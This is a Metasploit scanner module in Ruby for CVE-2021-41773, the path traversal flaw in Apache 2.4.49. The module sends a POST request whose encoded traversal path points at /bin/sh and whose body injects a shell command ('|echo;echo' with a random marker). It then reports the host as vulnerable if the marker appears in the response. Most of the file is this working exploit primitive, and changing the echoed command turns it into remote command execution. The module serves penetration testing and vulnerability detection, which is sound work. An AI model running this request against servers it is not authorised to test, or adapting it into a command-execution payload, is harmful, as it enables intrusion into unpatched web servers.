##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache 2.4.49 Traversal RCE scanner',
        'Description' => %q{
          This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
          it can be used to execute arbitrary commands (Remote Command Execution).
        },
        'References' => [
          ['CVE', '2021-41773'],
          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
        ],
        'Author' => [
          'Ash Daulton', # Vulnerability discovery
          'Dhiraj Mishra', # Metasploit auxiliary module
          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
        ],
        'DisclosureDate' => '2021-05-10',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
    ])
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def run_host(_ip)
    @proto = (ssl ? 'https' : 'http')

    traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
    data = Rex::Text.rand_text_alpha(4..8)

    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
    response = send_request_raw({
      'method' => 'POST',
      'uri' => uri,
      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;echo #{data}"
    })
    unless response
      print_error(message('No response, target seems down.'))

      return Exploit::CheckCode::Unknown
    end

    if response.code == 200 && response.body.include?(data)
      print_good(message('The target is vulnerable to CVE-2021-41773.'))
      report_vuln(
        host: target_host,
        name: name,
        refs: references
      )

      return Exploit::CheckCode::Vulnerable
    end

    print_error(message('The target is not vulnerable to CVE-2021-41773.'))

    return Exploit::CheckCode::Safe
  end
end
